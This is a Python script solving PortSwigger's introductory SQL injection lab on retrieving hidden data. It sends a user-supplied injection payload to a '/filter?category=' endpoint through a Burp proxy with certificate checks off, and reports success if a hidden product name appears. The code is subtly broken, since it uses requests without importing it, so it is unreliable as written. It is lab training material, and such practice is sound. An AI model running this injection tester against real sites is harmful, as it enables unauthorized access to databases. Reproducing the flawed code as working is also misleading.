#First SQLi lab from Portswigger, this script was made by Rana Khalil.
#https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # it will proxy through burpsuite it will help us debug

def exploit_sqli(url,payload): #this takes the URL from the lab we concatenate the uri, where the vulnerability is and the payload
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False   

if __name__ == "__main__": 
    try:
        url = sys.argv[1].strip() #the url comes from the second position of the argv
        payload = sys.argv[2].strip()#the payload comes from the third position of the argv
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
        
if exploit_sqli(url,payload): # if the funcion returns true then it's vulnerable to SQLi
    print ("[+] SQLi successful")
else:
    print("[-] SQLi Unsuccessful")